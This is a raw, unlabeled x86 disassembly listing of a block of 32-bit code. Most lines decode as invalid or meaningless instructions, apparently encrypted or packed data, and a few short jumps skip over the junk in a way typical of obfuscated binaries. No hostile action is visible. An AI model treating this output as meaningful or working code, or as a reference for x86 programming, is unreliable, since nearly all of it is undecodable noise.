  408bf7:	cmp    BYTE PTR [ebx+0x79],bh
  408bfa:	test   DWORD PTR ds:0x28f4a71a,ecx
  408c00:	daa    
  408c01:	xchg   BYTE PTR [edi],bh
  408c03:	adc    bh,BYTE PTR [eax-0x53a998ad]
  408c09:	pop    edi
  408c0a:	repnz jmp 0xfab3:0x81257450
  408c12:	mov    ah,0x5d
  408c14:	pop    ds
  408c15:	sub    BYTE PTR [ebp-0x77bd18cd],bl
  408c1b:	mov    WORD PTR [ebx],fs
  408c1d:	push   ecx
  408c1e:	nop
  408c1f:	(bad)  
  408c20:	jno    0x408bfa
  408c22:	lahf   
  408c23:	and    dl,dl
  408c25:	pop    ds
  408c26:	enter  0xcc76,0x1c
  408c2a:	loop   0x408c10
  408c2c:	xchg   BYTE PTR [ebx-0x7e],ch
  408c2f:	jnp    0x408c1c
  408c31:	inc    edi
  408c32:	inc    edi
  408c33:	bound  ecx,QWORD PTR [ecx+0x24800e98]
  408c39:	sbb    edi,edx
  408c3b:	sbb    ch,BYTE PTR [eax+ecx*1+0x155b11fe]
  408c42:	xor    DWORD PTR [eax],0x1602f1d5
  408c48:	and    bl,BYTE PTR [edi+0x41236c35]
  408c4e:	loop   0x408c32
  408c50:	cwde   
  408c51:	pop    esp
  408c52:	mov    al,0x6b
  408c54:	push   0x68fb35b8
  408c59:	sbb    si,WORD PTR [edi-0x7dfc666c]
  408c60:	retf   
  408c61:	xchg   ebp,eax
  408c62:	xchg   DWORD PTR [ecx],edx
  408c64:	pop    ecx
  408c65:	shl    DWORD PTR [eax+eiz*4],cl
  408c68:	pop    edi
  408c69:	into   
  408c6a:	aaa    
  408c6b:	cmp    bh,dl
  408c6d:	cs in  eax,0x34
  408c70:	stc    
  408c71:	leave  
  408c72:	in     eax,0xde
  408c74:	xchg   edx,eax
  408c75:	nop
  408c76:	in     eax,0x27
  408c78:	popf   
  408c79:	mov    BYTE PTR [ebx-0x65],dh
  408c7c:	aam    0x18
  408c7e:	dec    esp
  408c7f:	sub    esi,ebx
  408c81:	sbb    DWORD PTR [esi],eax
  408c83:	ds and al,0x29
  408c86:	xchg   esp,eax
  408c87:	mov    al,ds:0xf9e85691
  408c8c:	cmp    eax,DWORD PTR [ecx+0x19]
  408c8f:	test   eax,0x2f34d1b8
  408c94:	mov    bl,dh
  408c96:	fwait
  408c97:	out    dx,al
  408c98:	mov    edi,0x6355cbba
  408c9d:	xchg   edx,eax
  408c9e:	pop    edi
  408c9f:	pop    ss
  408ca0:	sub    edi,DWORD PTR [eax-0x6523a769]
  408ca6:	mov    ds:0x91dff209,al
  408cab:	(bad)  
  408cac:	mov    edx,DWORD PTR [edx]
  408cae:	ret    0xdb52
  408cb1:	lods   eax,DWORD PTR ds:[esi]
  408cb2:	enter  0x7cf,0xc5
  408cb6:	or     edi,DWORD PTR [ebx]
  408cb8:	inc    esi
  408cb9:	sti    
  408cba:	mov    cl,0x42
  408cbc:	ficom  WORD PTR [edx+ebx*1-0x29]
  408cc0:	or     BYTE PTR [edi],bl
  408cc2:	adc    edx,esi
  408cc4:	mov    ds:0xec911a48,al
  408cc9:	dec    esp
  408cca:	jne    0x408d44
  408ccc:	mov    ds:0xd514e110,al
  408cd1:	mov    al,ds:0xa4a6cfbf
  408cd6:	xlat   BYTE PTR ds:[ebx]
  408cd7:	xchg   edi,eax
  408cd8:	xor    al,0x26
  408cda:	popa   
  408cdb:	add    bh,BYTE PTR [edx+edx*8]
  408cde:	lds    eax,FWORD PTR [eax]
  408ce0:	push   edx
  408ce1:	fwait
  408ce2:	das    
  408ce3:	gs icebp 
  408ce5:	dec    ecx
  408ce6:	mov    esp,0x6d976765
  408ceb:	int3   
  408cec:	(bad)  
  408cee:	mov    ds:0x4d6978f8,eax
  408cf3:	push   cs
  408cf4:	out    dx,eax
  408cf5:	std    
  408cf6:	icebp  
  408cf7:	mov    eax,ds:0xdbf2684d
  408cfc:	xchg   bh,ch
  408cfe:	movups xmm2,XMMWORD PTR [edx+0x74fe4f07]
  408d05:	pop    ebp
  408d06:	pop    es
  408d07:	icebp  
  408d08:	fsubr  DWORD PTR [edi+0x3b782242]
  408d0e:	out    dx,al
  408d0f:	pop    esi
  408d10:	dec    edx
  408d11:	mov    al,0xa2
  408d13:	cwde   
  408d14:	xchg   esp,eax
  408d15:	xchg   di,ax
  408d17:	add    DWORD PTR [edx+0x3a],edx
  408d1a:	push   cs
  408d1b:	ror    DWORD PTR [edx+0x4c39f74e],1
  408d21:	lea    esp,[ecx+0x55]
  408d24:	inc    esp
  408d25:	ss aad 0xee
  408d28:	jmp    0xc9d:0x74953cb1
  408d2f:	jnp    0x408d1d
  408d31:	sbb    dh,bh
  408d33:	cmp    al,0xa8
  408d35:	xor    BYTE PTR [ebp+0x29],bl
  408d38:	fs data16 aaa 
  408d3b:	mov    edx,0xf11384a0
  408d40:	in     al,0x8e
  408d42:	dec    ebp
  408d43:	sbb    BYTE PTR [esi],dh
  408d45:	out    0x14,al
  408d47:	dec    edi
  408d48:	ret    
  408d49:	stos   DWORD PTR es:[edi],eax
  408d4a:	or     al,0x95
  408d4c:	sbb    ebx,esi
  408d4e:	fucom  st(0)
  408d50:	ins    BYTE PTR es:[edi],dx
  408d51:	add    BYTE PTR ds:0x183e5472,cl
  408d57:	cdq    
  408d58:	mov    bh,0x92
  408d5a:	or     BYTE PTR [ecx+0x74],0x31
  408d5e:	ins    BYTE PTR es:[edi],dx
  408d5f:	pop    ebx
  408d60:	fistp  DWORD PTR [edx-0x74]
  408d63:	stos   DWORD PTR es:[edi],eax
  408d64:	fisub  DWORD PTR [ebp-0x6dcb9cb6]
  408d6a:	scas   al,BYTE PTR es:[edi]
  408d6b:	daa    
  408d6c:	xchg   esi,eax
  408d6d:	lods   al,BYTE PTR ds:[esi]
  408d6e:	aaa    
  408d6f:	(bad)  
  408d72:	punpcklbw mm6,DWORD PTR [esp+eiz*4]
  408d76:	in     eax,0x7d
  408d78:	ins    DWORD PTR es:[edi],dx
  408d79:	std    
  408d7a:	not    ah
  408d7c:	adc    al,0x31
  408d7e:	mov    ds:0x391813a7,al
  408d83:	out    dx,eax
  408d84:	inc    ebx
  408d85:	frstor [eax+0x4e]
  408d88:	shr    BYTE PTR [edi+0x31],cl
  408d8b:	or     DWORD PTR [edx+0x749c8bf5],ebp
  408d91:	lods   al,BYTE PTR ds:[esi]
  408d92:	mov    al,dl
  408d94:	mov    ?,ebx
  408d96:	push   ecx
  408d97:	push   ss
  408d98:	arpl   WORD PTR [edi-0x42],si
  408d9b:	loope  0x408d7e
  408d9d:	and    ch,al
  408d9f:	rcr    BYTE PTR [ecx-0x39],0x9
  408da3:	jg     0x408e06
  408da5:	in     al,0x8b
  408da7:	jb     0x408dc5
  408da9:	mov    eax,ds:0x57846abe
  408dae:	cmp    eax,0xca788480
  408db3:	fld1   
  408db5:	out    dx,eax
  408db6:	popf   
  408db7:	pop    ebp
  408db8:	cmp    al,cl
  408dba:	xor    DWORD PTR [esi],edi
  408dbc:	push   edi
  408dbd:	scas   al,BYTE PTR es:[edi]
  408dbe:	out    0xb8,eax
  408dc0:	in     al,dx
  408dc1:	mov    dl,bl
  408dc3:	fidiv  DWORD PTR [eax+0x1a89870]
  408dc9:	xor    ebx,DWORD PTR [ebx-0x8]
  408dcc:	sub    ch,BYTE PTR [ebx]
  408dce:	inc    esp
  408dcf:	cmc    
  408dd0:	or     ah,BYTE PTR [edx*1-0x41bd96e3]
  408dd7:	xchg   esi,eax
  408dd8:	mov    al,0x9b
  408dda:	and    ecx,DWORD PTR [esi+eiz*4+0x3a]
  408dde:	add    edi,esi
  408de0:	push   0xffffffea
  408de2:	ins    DWORD PTR es:[edi],dx
  408de3:	call   0x7fc1ac1e
  408de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de9:	xchg   BYTE PTR [ebx],cl
  408deb:	sbb    bl,al
  408ded:	inc    ecx
  408dee:	add    ebx,eax
  408df0:	test   eax,0xbb4771c
  408df5:	lahf   
  408df6:	add    BYTE PTR [edi+0x1faddcdf],0x37
  408dfd:	xor    DWORD PTR [ecx],ebx
  408dff:	sbb    al,0x2
  408e01:	out    dx,eax
  408e02:	daa    
  408e03:	fdiv   DWORD PTR ds:0xc70b253b
  408e09:	mov    edi,0x9b99e4a1
  408e0e:	cmp    DWORD PTR [eax+0x57a3bf11],esp
  408e14:	fsub   DWORD PTR [edx+0x26]
  408e17:	out    dx,eax
  408e18:	adc    BYTE PTR [eax-0x4e2316ab],bh
  408e1e:	mov    ebx,DWORD PTR [eax+ebx*2-0x32ec609c]
  408e25:	pop    edx
  408e26:	rcr    DWORD PTR [ecx+0x4afed8eb],1
  408e2c:	mov    eax,0x3b2501d0
  408e31:	push   ebp
  408e32:	dec    eax
  408e33:	mov    edi,0x30f863bf
  408e38:	mov    cl,bl
  408e3a:	fmul   DWORD PTR [ebx]
  408e3c:	xlat   BYTE PTR ds:[ebx]
  408e3d:	mov    dl,0x21
  408e3f:	jmp    0x8902:0xd0ac0fcd
  408e46:	inc    ebp
  408e47:	adc    al,0x8b
  408e49:	push   es
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	inc    ecx
  408e76:	sar    BYTE PTR [edi+0x18513ab0],cl
  408e7c:	sbb    BYTE PTR [esi-0x1ee7e7ee],bl
  408e82:	repnz mov eax,0x26b22f31
  408e88:	outs   dx,BYTE PTR ds:[esi]
  408e89:	jecxz  0x408ea8
  408e8b:	int3   
  408e8c:	pop    eax
  408e8d:	lock inc ebp
  408e8f:	adc    al,0x20
  408e91:	fwait
  408e92:	sub    dh,BYTE PTR [ecx]
  408e94:	xchg   BYTE PTR [ebx],cl
  408e96:	stc    
  408e97:	xchg   BYTE PTR [edi-0x58dfb76a],ah
  408e9d:	ret    0x86e4
  408ea0:	sbb    eax,0xa1b3b9ed
  408ea5:	sbb    bh,dl
  408ea7:	dec    eax
  408ea8:	push   ss
  408ea9:	fsub   st(3),st
  408eab:	push   esi
  408eac:	sti    
  408ead:	pop    edx
  408eae:	xor    al,bh
  408eb0:	cdq    
  408eb1:	inc    esi
  408eb2:	(bad)  
  408eb4:	ja     0x408f1d
  408eb6:	mov    edx,0x6a1b6d0
  408ebb:	test   al,0x9e
  408ebd:	(bad)  
  408ebe:	ja     0x408f2b
  408ec0:	imul   ebp,DWORD PTR [ebx],0x25
  408ec3:	mov    ds:0x30ac6cc9,eax
  408ec8:	sub    DWORD PTR [eax],ebx
  408eca:	dec    esi
  408ecb:	xchg   esi,eax
  408ecc:	mov    bh,BYTE PTR [ebx]
  408ece:	jns    0x408f0a
  408ed0:	push   ds
  408ed1:	jle    0x408f45
  408ed3:	(bad)  
  408ed4:	pop    eax
  408ed5:	dec    edi
  408ed6:	fimul  WORD PTR [eax+edi*1]
  408ed9:	pop    ds
  408eda:	fnsave [esi+0x1e]
  408edd:	dec    eax
  408ede:	fld    QWORD PTR [ecx+0x2a]
  408ee1:	cli    
  408ee2:	not    BYTE PTR [edi+edi*1]
  408ee5:	retf   0xc47e
  408ee8:	jno    0x408e71
  408eea:	das    
  408eeb:	adc    BYTE PTR [ebx-0x34],dl
  408eee:	test   eax,0xeae68883
  408ef3:	cdq    
  408ef4:	sbb    ebp,DWORD PTR [esi]
  408ef6:	jb     0x408e9a
  408ef8:	and    DWORD PTR [ecx],esp
  408efa:	cmp    cl,BYTE PTR [edx]
  408efc:	cmp    eax,0x7bb0a847
  408f01:	push   edi
  408f02:	mov    ecx,0xe82e5135
  408f07:	fs call 0xb295d1ae
  408f0d:	gs jle 0x408f3a
  408f10:	adc    bh,BYTE PTR [eax]
  408f12:	push   ss
  408f13:	push   ds
  408f14:	mov    edi,DWORD PTR [edx+eiz*8+0x4f]
  408f18:	retf   0xb612
  408f1b:	sbb    eax,0x826947ca
  408f20:	int    0xca
  408f22:	jno    0x408f45
  408f24:	loope  0x408f8d
  408f26:	jbe    0x408ee9
  408f28:	mov    ds:0x14f45771,eax
  408f2d:	mov    bh,0x51
  408f2f:	sbb    BYTE PTR [eax+0x16cec40b],ch
  408f35:	push   edi
  408f36:	stos   DWORD PTR es:[edi],eax
  408f37:	sbb    esi,DWORD PTR [edi]
  408f39:	lods   al,BYTE PTR ds:[esi]
  408f3a:	sub    al,0x84
  408f3c:	xor    BYTE PTR [edi],dh
  408f3e:	das    
  408f3f:	popf   
  408f40:	loopne 0x408f06
  408f42:	out    dx,al
  408f43:	jo     0x408f2a
  408f45:	inc    esp
  408f46:	cmove  ebp,DWORD PTR [esi]
  408f49:	jp     0x408fac
  408f4b:	outs   dx,BYTE PTR ds:[esi]
  408f4c:	into   
  408f4d:	sub    eax,0x5f9f8e0d
  408f52:	pop    ecx
  408f53:	push   0x2926bba7
  408f58:	jbe    0x408fb5
  408f5a:	jb     0x408fba
  408f5c:	loopne 0x408f98
  408f5e:	xchg   esp,eax
  408f5f:	push   esp
  408f60:	out    0x46,eax
  408f62:	and    ah,BYTE PTR ds:0xdca39641
  408f68:	pop    esi
  408f69:	mov    esi,0x8a2870be
  408f6e:	retf   0x57ed
  408f71:	test   al,0x80
  408f73:	(bad)  
  408f74:	lods   al,BYTE PTR ds:[esi]
  408f75:	call   0xbce6:0x92a3c705
  408f7c:	rep lods eax,DWORD PTR ds:[esi]
  408f7e:	push   ecx
  408f7f:	xchg   esi,eax
  408f80:	pusha  
  408f81:	test   al,0x61
  408f83:	add    eax,0x4c0690ee
  408f88:	(bad)
  408f8b:	pop    ebp
  408f8c:	icebp  
  408f8d:	fsubr  DWORD PTR [eax-0x27]
  408f90:	scas   eax,DWORD PTR es:[edi]
  408f91:	in     eax,0xb5
  408f93:	pop    edi
  408f94:	in     al,dx
  408f95:	shr    DWORD PTR [eax],0xbe
  408f98:	add    DWORD PTR [edi-0xe],0xfe67cce8
  408f9f:	add    DWORD PTR [ebx-0x1ad676ef],0x4d
  408fa6:	cli    
  408fa7:	mov    edi,0x28a8fc8c
  408fac:	or     BYTE PTR [ecx],bh
  408fae:	jmp    0x34a5:0xa6eb564d
  408fb5:	lahf   
  408fb6:	jl     0x409007
  408fb8:	es pop eax
  408fba:	mov    fs,WORD PTR es:[edi+esi*4+0x7f15fdc5]
  408fc2:	rcr    BYTE PTR [eax],cl
  408fc4:	lea    edi,[ebx-0x2c16d5e9]
  408fca:	bound  esp,QWORD PTR [edi]
  408fcc:	out    dx,eax
  408fcd:	cwde   
  408fce:	scas   eax,DWORD PTR es:[edi]
  408fcf:	xchg   esp,eax
  408fd0:	icebp  
  408fd1:	pop    eax
  408fd2:	mov    ah,0x6c
  408fd4:	mov    edi,0xce8d9da1
  408fd9:	jecxz  0x408f5b
  408fdb:	cmc    
  408fdc:	push   ebx
  408fdd:	retf   0x1e40
  408fe0:	gs mov dh,0x9f
  408fe3:	push   0xfffffff3
  408fe5:	out    0x2b,eax
  408fe7:	and    bh,dh
  408fe9:	dec    edx
  408fea:	ror    DWORD PTR [edx+0x1e721c6b],0xf6
  408ff1:	dec    ecx
  408ff2:	xlat   BYTE PTR ds:[ebx]
  408ff3:	iret   
  408ff4:	fisubr WORD PTR [edx]
  408ff6:	push   esi
  408ff7:	add    eax,0x24310077
  408ffc:	(bad)  
  408ffe:	mov    ss,edi
  409000:	or     BYTE PTR [ebp-0xe],dl
  409003:	leave  
  409004:	outs   dx,BYTE PTR ds:[esi]
  409005:	or     eax,0xff4cf25c
  40900a:	ins    BYTE PTR es:[edi],dx
  40900b:	adc    bl,BYTE PTR [ebp+0x43]
  40900e:	push   ecx
  40900f:	and    BYTE PTR [eax],bh
  409011:	jb     0x409075
  409013:	dec    ebp
  409014:	mov    al,BYTE PTR [edx+0x65]
  409017:	loope  0x409004
  409019:	inc    ecx
  40901a:	push   ss
  40901b:	jns    0x408fec
  40901d:	sub    eax,0xaf177bfe
  409022:	sbb    eax,0xc22339f9
  409027:	scas   al,BYTE PTR es:[edi]
  409028:	ret    0xb484
  40902b:	lods   al,BYTE PTR ds:[esi]
  40902c:	mov    ds:0xf7646be8,eax
  409031:	sub    bl,bh
  409033:	sbb    ch,bh
  409035:	fdiv   QWORD PTR [esi]
  409037:	mov    edx,0x32021cf
  40903c:	je     0x4090b2
  40903e:	aad    0x83
  409040:	icebp  
  409041:	sahf   
  409042:	pop    eax
  409043:	pop    ds
  409044:	jge    0x409092
  409046:	cmp    ebx,eax
  409048:	mov    ds:0x1e8649ed,al
  40904d:	in     al,dx
  40904e:	outs   dx,DWORD PTR ds:[esi]
  40904f:	sahf   
  409050:	ret    
  409051:	mov    eax,ds:0x7bdac8c5
  409056:	cmp    edx,esi
  409058:	jo     0x40909e
  40905a:	push   ecx
  40905b:	xor    bl,BYTE PTR [eax+0x4a]
  40905e:	aam    0x78
  409060:	ins    BYTE PTR es:[edi],dx
  409061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409062:	xchg   esp,eax
  409063:	mov    ss,WORD PTR [esp+eiz*4-0x63]
  409067:	xor    al,0x26
  409069:	(bad)  
  40906a:	fiadd  DWORD PTR [edx+0x61]
  40906d:	or     cl,BYTE PTR [esi]
  40906f:	jne    0x4090be
  409071:	and    DWORD PTR [esi],0xffffff9c
  409074:	fs xor edx,0x57
  409078:	loopne 0x4090a6
  40907a:	arpl   WORD PTR [eax+0x4edcee],si
  409080:	dec    eax
  409081:	or     eax,0x2adbb244
  409086:	jb     0x4090a0
  409088:	xor    al,0x46
  40908a:	stos   BYTE PTR es:[edi],al
  40908b:	pop    edx
  40908c:	mov    ah,0xa
  40908e:	jge    0x40904c
  409090:	add    esi,DWORD PTR [edx]
  409092:	jo     0x4090f5
  409094:	inc    ecx
  409095:	mov    esp,0x50149429
  40909a:	in     al,0xc0
  40909c:	hlt    
  40909d:	or     ch,bh
  40909f:	fsubr  QWORD PTR [esi-0x35b51259]
  4090a5:	arpl   WORD PTR [ebx],bx
  4090a7:	inc    edi
  4090a8:	shr    ebp,0xdd
  4090ab:	jnp    0x40909d
  4090ad:	lods   al,BYTE PTR ds:[esi]
  4090ae:	rol    bh,1
  4090b0:	fld    DWORD PTR [ebx+0x10]
  4090b3:	jns    0x40912d
  4090b5:	aad    0xb4
  4090b7:	xor    DWORD PTR [ebp+0x13],0x3903e220
  4090be:	pop    es
  4090bf:	nop
  4090c0:	lods   al,BYTE PTR ds:[esi]
  4090c1:	inc    ebp
  4090c2:	dec    edx
  4090c3:	rcr    eax,1
  4090c5:	jo     0x40908c
  4090c7:	jno    0x4090e7
  4090c9:	not    BYTE PTR [edx-0x227aeaab]
  4090cf:	cmp    BYTE PTR [edx+edi*1+0x6e34a7da],dh
  4090d6:	mov    esi,0x3a974ac5
  4090db:	xchg   esp,eax
  4090dc:	int3   
  4090dd:	lds    edx,FWORD PTR [edi-0x39]
  4090e0:	adc    BYTE PTR [ecx-0x1d03de7c],ch
  4090e6:	mov    ebp,0xdee5203d
  4090eb:	fdivr  st,st(2)
  4090ed:	aam    0xd9
  4090ef:	in     eax,dx
  4090f0:	scas   eax,DWORD PTR es:[edi]
  4090f1:	ins    DWORD PTR es:[edi],dx
  4090f2:	inc    esp
  4090f3:	inc    ebx
  4090f4:	mov    ds:0x130f2017,eax
  4090f9:	std    
  4090fa:	sahf   
  4090fb:	dec    ebp
  4090fc:	jb     0x40909b
  4090fe:	fdecstp 
  409100:	jae    0x4090bb
  409102:	adc    esi,DWORD PTR ds:[eax+0x3e1d2924]
  409109:	mov    al,ds:0xea934eb1
  40910e:	inc    ecx
  40910f:	sbb    al,0x2e
  409111:	adc    DWORD PTR [ebx-0x1cf9c565],ebp
  409117:	fst    QWORD PTR [ebx+0x57]
  40911a:	and    al,0xa8
  40911c:	sti    
  40911d:	add    BYTE PTR [ebp-0x4f1f813b],ch
  409123:	adc    esi,DWORD PTR [esi]
  409125:	rcr    ch,1
  409127:	(bad)  
  409128:	jg     0x409140
  40912a:	ficomp WORD PTR [esi]
  40912c:	pop    ss
  40912d:	lock mov esp,0xe1953e46
  409133:	(bad)  
  409135:	fstp   TBYTE PTR ds:0x97556461
  40913b:	and    DWORD PTR ds:0x9dfd0c96,esi
  409141:	cmc    
  409142:	stc    
  409143:	in     eax,dx
  409144:	adc    BYTE PTR [ebx-0x6d13582d],dh
  40914a:	(bad)  
  40914b:	fiadd  DWORD PTR [edi+0x4b]
  40914e:	in     eax,0x18
  409150:	(bad)  
  409151:	pop    eax
  409152:	scas   al,BYTE PTR es:[edi]
  409153:	xor    al,0x5a
  409155:	xor    DWORD PTR [ecx+0x462c471],ebp
  40915b:	sub    ebp,DWORD PTR [ecx+0x42]
  40915e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40915f:	in     eax,dx
  409160:	push   es
  409161:	outs   dx,BYTE PTR ds:[esi]
  409162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409163:	sub    ecx,DWORD PTR [esi-0x1e]
  409166:	mov    eax,ebx
  409168:	cdq    
  409169:	dec    esi
  40916a:	idiv   esi
  40916c:	xchg   ebx,eax
  40916d:	add    edx,eax
  40916f:	fdiv   st,st(1)
  409171:	push   ecx
  409172:	xchg   edx,eax
  409173:	(bad)  
  409174:	cmp    al,0xbe
  409176:	and    al,0xca
  409178:	pop    eax
  409179:	sub    bl,BYTE PTR [ecx+0x5cf2700a]
  40917f:	repz jg 0x40914e
  409182:	jge    0x40919c
  409184:	cli    
  409185:	jns    0x4091e5
  409187:	push   ebp
  409188:	and    eax,0xd3cf6d92
  40918d:	jp     0x4091f0
  40918f:	dec    ecx
  409190:	das    
  409191:	ins    BYTE PTR es:[edi],dx
  409192:	sti    
  409193:	inc    edi
  409194:	fst    st(3)
  409196:	adc    al,0xec
  409198:	iret   
  409199:	rcr    DWORD PTR [ecx-0x4],cl
  40919c:	push   eax
  40919d:	xchg   BYTE PTR [ebp+0x3f266a02],al
  4091a3:	cwde   
  4091a4:	hlt    
  4091a5:	int3   
  4091a6:	cmp    BYTE PTR [edi],ch
  4091a8:	sbb    al,0xb0
  4091aa:	in     eax,0x94
  4091ac:	outs   dx,DWORD PTR ds:[esi]
  4091ad:	scas   eax,DWORD PTR es:[edi]
  4091ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091af:	jmp    FWORD PTR fs:[edx+0x1a704382]
  4091b6:	sbb    eax,0x4d5ec714
  4091bb:	dec    edx
  4091bc:	jb     0x4091ab
  4091be:	sbb    eax,esi
  4091c0:	jmp    0x409230
  4091c2:	mov    eax,ds:0x9749a667
  4091c7:	rcr    DWORD PTR ds:0xe3e115ec,0xfa
  4091ce:	dec    ecx
  4091cf:	aas    
  4091d0:	pop    ss
  4091d1:	les    eax,FWORD PTR [eax+0x34a7b4d]
  4091d7:	daa    
  4091d8:	jns    0x7dc96134
  4091de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091df:	xor    al,0xfe
  4091e1:	adc    bh,bh
  4091e3:	outs   dx,BYTE PTR ds:[esi]
  4091e4:	push   edx
  4091e5:	(bad)  
  4091e6:	(bad)  
  4091e8:	fld    DWORD PTR [ecx+0xa]
  4091eb:	or     BYTE PTR [ebx],al
  4091ed:	pop    es
  4091ee:	shr    BYTE PTR [edi-0x48dc6160],cl
  4091f4:	dec    eax
  4091f5:	loopne 0x40919d
  4091f7:	push   edi
  4091f8:	or     BYTE PTR [ecx-0x3adb4b22],0xf5
  4091ff:	outs   dx,DWORD PTR ds:[esi]
  409200:	push   ss
  409201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409202:	mov    esp,0x28a29bf3
  409207:	stc    
  409208:	repnz retf 
  40920a:	in     al,0x37
  40920c:	and    BYTE PTR [esi],0x45
  40920f:	cmp    DWORD PTR [esi+0x2d],esp
  409212:	dec    edi
  409213:	test   al,0xa2
  409215:	and    DWORD PTR [edx-0x4ea69579],ecx
  40921b:	sti    
  40921c:	pop    ecx
  40921d:	dec    DWORD PTR [edx+ecx*2]
  409220:	mov    ebx,0x357ff198
  409225:	and    al,0xb1
  409227:	cmp    eax,DWORD PTR [ebx]
  409229:	push   ss
  40922a:	nop
  40922b:	push   ebp
  40922c:	inc    edx
  40922d:	jle    0x4092a9
  40922f:	push   ecx
  409230:	xchg   ecx,eax
  409231:	scas   al,BYTE PTR es:[edi]
  409232:	pushf  
  409233:	jnp    0x409258
  409235:	add    eax,0x9784f67d
  40923a:	nop
  40923b:	and    DWORD PTR [esi-0x43],eax
  40923e:	stc    
  40923f:	mov    esi,DWORD PTR [eax]
  409241:	dec    ebp
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0x9319a170
  409261:	mov    esp,0x181849c0
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [ecx-0x24],ah
  40926c:	or     bh,bl
  40926e:	and    dh,ch
  409270:	cmp    DWORD PTR [ebx],eax
  409272:	mov    bh,BYTE PTR [edi+esi*8+0x268b7fb3]
  409279:	jp     0x4092ac
  40927b:	sahf   
  40927c:	pusha  
  40927d:	inc    ecx
  40927e:	inc    ecx
  40927f:	imul   eax,DWORD PTR [ebp-0x533de6b9],0x36425dff
  409289:	arpl   WORD PTR [ecx],cx
  40928b:	call   0xd699dda6
  409290:	or     al,0x4e
  409292:	in     eax,0x82
  409294:	hlt    
  409295:	aam    0xf4
  409297:	test   DWORD PTR [esi+ebp*1+0x37c86277],0x4e7badac
  4092a2:	aas    
  4092a3:	ja     0x4092ea
  4092a5:	mov    edx,ebx
  4092a7:	and    edi,DWORD PTR [esi-0x695944db]
  4092ad:	fiadd  WORD PTR [edx-0x3723abcc]
  4092b3:	test   DWORD PTR [eax-0x4],esi
  4092b6:	mov    esp,DWORD PTR [edx]
  4092b8:	sbb    al,cl
  4092ba:	push   cs
  4092bb:	jbe    0x4092ea
  4092bd:	add    al,0x7b
  4092bf:	cmp    ebp,ecx
  4092c1:	dec    ecx
  4092c2:	es xchg ecx,eax
  4092c4:	outs   dx,DWORD PTR ds:[esi]
  4092c5:	hlt    
  4092c6:	jmp    0x409261
  4092c8:	xor    DWORD PTR [ebp-0x7aecc772],esp
  4092ce:	sub    BYTE PTR [ecx-0x1ae6519d],0x8
  4092d5:	inc    esp
  4092d6:	int    0xf1
  4092d8:	mov    dh,0xdc
  4092da:	dec    ecx
  4092db:	lds    edi,FWORD PTR [ecx]
  4092dd:	adc    eax,0x636c55a2
  4092e2:	mov    ecx,0xf2ec7a19
  4092e7:	scas   eax,DWORD PTR es:[edi]
  4092e8:	scas   al,BYTE PTR es:[edi]
  4092e9:	cmc    
  4092ea:	dec    ebp
  4092eb:	xchg   ebx,eax
  4092ec:	je     0x40936c
  4092ee:	aas    
  4092ef:	out    0x9a,al
  4092f1:	cmp    eax,DWORD PTR [ebx+0x55]
  4092f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f5:	fsubr  DWORD PTR [ebx+0x4119b150]
  4092fb:	or     BYTE PTR [ebx+0x6b],ah
  4092fe:	ja     0x4092b5
  409300:	popf   
  409301:	push   ebx
  409302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409303:	(bad)  [esi+0x5efb210b]
  409309:	mov    al,0xc9
  40930b:	addr16 fs push ecx
  40930e:	sar    BYTE PTR [edi+0x20],0x3e
  409312:	es xchg ebx,eax
  409314:	(bad)  
  409315:	mov    ebp,0xb0d32c6
  40931a:	loopne 0x409301
  40931c:	cs nop
  40931e:	pop    ebx
  40931f:	fcmovb st,st(2)
  409321:	adc    esp,DWORD PTR [ebp-0x2256ca76]
  409327:	mov    ds:0x1ccc9de4,eax
  40932c:	cs jne 0x40937f
  40932f:	sub    DWORD PTR [esi],ebx
  409331:	ror    BYTE PTR [ebx+0x2d],0x80
  409335:	scas   eax,DWORD PTR es:[edi]
  409336:	out    0xa6,eax
  409338:	sub    DWORD PTR [ecx],0xffffffa3
  40933b:	pusha  
  40933c:	(bad)  
  40933d:	fcom   DWORD PTR [ecx]
  40933f:	test   BYTE PTR [edx-0x77327cb],bl
  409345:	cmp    esp,0xffffffff
  409348:	jno    0x4093c5
  40934a:	sbb    esi,eax
  40934c:	or     al,0xec
  40934e:	push   ebx
  40934f:	dec    ecx
  409350:	popa   
  409351:	xor    ah,bh
  409353:	(bad)  
  409354:	and    DWORD PTR [ebp+0x1cc4dd6e],edx
  40935a:	(bad)  
  40935b:	sahf   
  40935c:	aas    
  40935d:	xchg   edx,eax
  40935e:	pop    ss
  40935f:	pop    ds
  409360:	xor    eax,0x4c88857e
  409365:	jo     0x40931f
  409367:	sbb    al,0xc9
  409369:	sub    BYTE PTR [ecx-0x3e],dh
  40936c:	jno    0x409358
  40936e:	push   ecx
  40936f:	repz sub eax,0xf01bc6
  409375:	jl     0x409378
  409377:	push   0x33
  409379:	xchg   ebp,eax
  40937a:	fimul  DWORD PTR [esi-0x3b]
  40937d:	push   ecx
  40937e:	call   0x240:0x87e8213f
  409385:	or     al,0x3b
  409387:	out    0x2e,eax
